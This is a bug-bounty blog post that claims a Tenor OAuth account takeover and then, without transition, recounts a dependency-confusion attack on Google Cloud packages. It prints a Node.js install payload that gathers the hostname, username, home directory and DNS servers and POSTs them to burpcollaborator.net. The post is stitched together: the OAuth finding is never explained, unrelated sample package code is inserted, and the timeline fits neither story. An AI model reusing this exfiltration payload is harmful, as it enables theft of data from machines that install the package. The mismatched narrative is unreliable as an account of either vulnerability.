+++
title = "All Accounts Takeover On Tenor Due to No Authorization Of Oauth Token 🍁"
date = "2022-03-12"
author = "0xdroopy"


+++

## Introduction 

Hey, People hope you all are doing well! It is been a great time since we met through our daily blogs of my findings on certain programs. For the last three months, I have been stuck to the Google VRP and found something really interesting and critical. The reason I wanted to write about this is because of how much fun I had finding it. This was an unexpected find that caught my attention while testing one of the big acquisitions owned by Google LLC. which is a famous Gif solution named Tenor.
Please note that Tenor has passed its 6 month blackout period which is described by the Google allowing it to go for monetary rewards.
## Story


I was looking at one of the acquisitions owned by Google Inc. lately in 2016. After all, recognizing it as a rewardable asset, I began hunting on it. After a bit of observation, I stopped at the Oauth Flow which got my attention even more. After some requests, it came to notice for me that a serious misconfiguration is going on which was helpful for the attacker to take over every single account on tenor.com.

{{< image src="https://momreadit.files.wordpress.com/2021/04/hello-garden-1.jpg" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

This was an really unexpected as well as very interesting find and has severly impact on the users as well as developers using it in order to make, upload and create the awesome gifs. In order to exploit you should need to deep dive in the requests made during logging in the account on tenor.com using an OAuth functionality. 

## How Oauth Flow Works?

{{< image src="https://docs.oracle.com/cd/E82085_01/160023/JOS%20Implementation%20Guide/Output/img/oauth2-caseflow.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Oauth is a simple functionality used in many applications in order to make them signing with the existing account on certain platforms. Google has one of the most famous Oauth which works in almost every application we see in our day to day needs. Oauth flow has a very systematic and a secure way to make and create the account on specific platforms. There are many oauth functionalities present, but here we are going to talk about the one which Tenor uses - Authorization Code. 
#### While Clicking Sign In With Google
```http
GET /o/oauth2/auth?redirect_uri=storagerelay%3A%2F%2Fhttps%2Ftenor.com%3Fid%3Dauth251216&response_type=permission%20id_token&scope=email%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Ftenor&openid.realm=&include_granted_scopes=true&client_id=XXXXXXXXXXXXXXXXXXXXXX HTTP/2
Host: accounts.google.com
Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://tenor.com/
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Te: trailers
```

#### Selecting Google Account
```http
GET /o/oauth2/iframerpc?action=issueToken&response_type=token%20id_token&login_hint=AJDLj6JXrAdwGc8b9pldZZaLHnjbRv3xVIz49lxCkoyi6HA9WkOQWbSqF0MrONvcPKEhKZWphhY294SMOezVRY7_j32MAaN6SQ&client_id=598652403343-harjvt5thjol9qjkrfqpmb7njrnek80v.apps.googleusercontent.com&origin=https%3A%2F%2Ftenor.com&scope=email%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Ftenor&ss_domain=https%3A%2F%2Ftenor.com&include_granted_scopes=true HTTP/2
Host: accounts.google.com
Cookie: __Host-GAPS=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XmlHttpRequest
Dnt: 1
Referer: https://accounts.google.com/o/oauth2/iframe
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
```

#### Response from the server with request of Oauth Token

```http
POST /keyboard.login HTTP/1.1
Host: api-v1.tenor.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://tenor.com/
Content-Type: application/x-www-form-urlencoded
Origin: https://tenor.com
Content-Length: 997
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers
Connection: close

gaia_token=<Oauth-Token>
```

## Whats There In These Requests To Notice?


{{< image src="https://cdn11.bigcommerce.com/s-jyvxk5hzsq/images/stencil/1280x1280/products/6029/44001/6751L__24754.1539348498.jpg?c=2s" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}
 

[**Pypi**](https://pypi.org) is a platform where you can upload various packages on your own based on python framework.

```python
import pathlib
from setuptools import setup

# The directory containing this file
HERE = pathlib.Path(__file__).parent

# The text of the README file
README = (HERE / "README.md").read_text()

# This call to setup() does all the work
setup(
    name="realpython-reader",
    version="1.0.0",
    description="Read the latest Real Python tutorials",
    long_description=README,
    long_description_content_type="text/markdown",
    url="https://github.com/realpython/reader",
    author="Real Python",
    author_email="info@realpython.com",
    license="MIT",
    classifiers=[
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.7",
    ],
    packages=["reader"],
    include_package_data=True,
    install_requires=["feedparser", "html2text"],
    entry_points={
        "console_scripts": [
            "realpython=reader.__main__:main",
        ]
    },
)
```


### Npm

Similarly in Node Js there is a platform name [**Npm**](https://www.npmjs.com/) which allows the user to upload open source packages.
```js
// module.exports exports the function getContests as a promise and exposes it as a module.
// we can import an exported module by using require().
module.exports = async function getContests() {
  const axios = require("axios"); // Importing the Axios module to make API requests
  var result;

  const username; // Insert Your Username here
  const api_key; //Insert API key here

  await axios // Making a GET request using axios and requesting information from the API
    .get(
      "https://clist.by/api/v1/json/contest/?username=" + username + "&api_key=" + api_key + "&limit=20&end__gt=2020-09-19T00%3A00%3A00"
    )
    .then((response) => { // If the GET request is successful, this block is executed
      return response; // The response of the API call is passed on to the next block
    })
    .then((contests) => { // In this block, we store the response data into a variable 'result'
      result = contests.data.objects;
    })
    .catch((err) => {
      console.log(err); // Error handler
    });
  return result; // The contest data is returned
};
```
### Private Packages
Bigger organisations like Google, Facebook, Apple make their own packages for their company by which their systems communicate and download internally. Usually these are done in order to mantain the privacy to the sensitive content in the organisation. The Private Package looks like-
```bash
pip install --index-ur=https://pip.company.com/ company-oauth
```
### Combined Packages
Not to our surprise there is a third category as well which allows the system to use both Public and Private packages giving us Combined Packages. These packages have a catch, they have to decide which package to decide. They usually go for this type of package which has a higher version as they didnt want to install the updated library for their system again and again.

{{< image src="https://docstore.mik.ua/orelly/oracle/prog2/figs/sql2.1603.gif" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

## What's the Bug here?

The combined Packages which we talked about recently makes the things more interesting and exploitable. What attacker's do is make the package of same name on the open-source platform with malicious code in it. By which when the system from the organization tries to access the package . Now the distinctive nature comes about JFrog Artifactory ,which makes the system to choose the package with the higher version rather than  the package on the same system. The attacker's upload the package with identical name with higher version than the internal package which makes the system or api to catch the pipeline of package having higher version.


{{< image src="https://raw.githubusercontent.com/NikhilkaushikOp/bugs-by-nikhil-kaushik/main/Repeater%20(4).png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

## Ah! The Recon!

In order to perform the recon I first wanted to know where and which the packages lie. Google Cloud Services uses packages which are not listed anywhere in the ocean of internet. I go throughed all the documentation of all the products in the Cloud Service but didn't have any clue about the heavy weight packages. Now my inner brain says lets go for Github Recon. After spending about 2 Hours it failed. Google dosen't save their information on Github at all. Now what I have to do is simply and most efficient which works for me - Automation! I have made many of the tools on my own , I will make them public after I give them a final touch. I began scanning the packages on all the products of Google Cloud Services. I slept at night making my VPS a kickstart. When I woked up early in morning, I was surprised. The Vps has almost found out 20-25 packages. Now I immediately have to see which one is private, public and combined. There were all types of packages including python and node.js.

## The Exploitaion
After investigating, I found out that the Combined packages were total of 9. Among which there were 5 python and 4 npm packages. I quickly went to the open-source programs listed before and quickly started searching which packages are missing and which are not? After a while , I founded Out of 9 only one package is missing on the platform. I quickly made a package with the same name of the package and wrote my Remote Code Execution Code below-

```java
//author:- mypackage@protonmail.com
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const packageJSON = require("./package.json");
const package = packageJSON.name;

const trackingData = JSON.stringify({
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: dns.getServers(),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "burpcollaborator.net", //replace burpcollaborator.net with Interactsh or pipedream
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
```

In this malicious code above I put my burp collaborater in order to receive the callback if the code is being executed on the server. I waited, waited and waited. Callback hasn't came until 5 hours. I decided to wait 1 more hour and then just shutdown my whole plan. After around 33 minutes , I recieved a callback to my burp collaborater.

{{< image src="https://user-images.githubusercontent.com/8293321/135176099-0e3fa01c-bdce-4f04-a94f-de0a34c7abf6.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

This was something I never expected that happened now. I just left my system and gone out. After coming back I quickly reported to Google Vrp. Within 15 minutes my report got Triaged and Accepted. 

## Why it is considered as a Deep Gold Mine?
Yeah by this , everyone will believe that it is a gold mine and look for same type of bugs. But there's a catch, The way you recon means a lot. If your recon is weak then you would never be able to find this in the near time. Your recon should be accessible to all the endpoints withing the program and as well as using third party platforms - Github, Shodan , Google Dorks etc. The attack Dependency Confusion is still not very overrated but I want to disclose as this was a bit that I got from the community and here is what I returned.

{{< image src="https://64.media.tumblr.com/a76def644cc0b31881be79547604ee33/2c3aa8307bc296b3-e1/s540x810/4dedfb1c6a23bf52ae91154e79971567718ffbc4.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}



## Timeline:

[Dec 24, 2021] - Bug reported

[Dec 24, 2021] - Initial triage

[Dec 24, 2021] - Bug accepted (P4 -> P1)

[Jan 02, 2022] - Bug mitigated by temporarily disabling the Moments feature

[Jan 14, 2022] - Reward of $XXXX issued
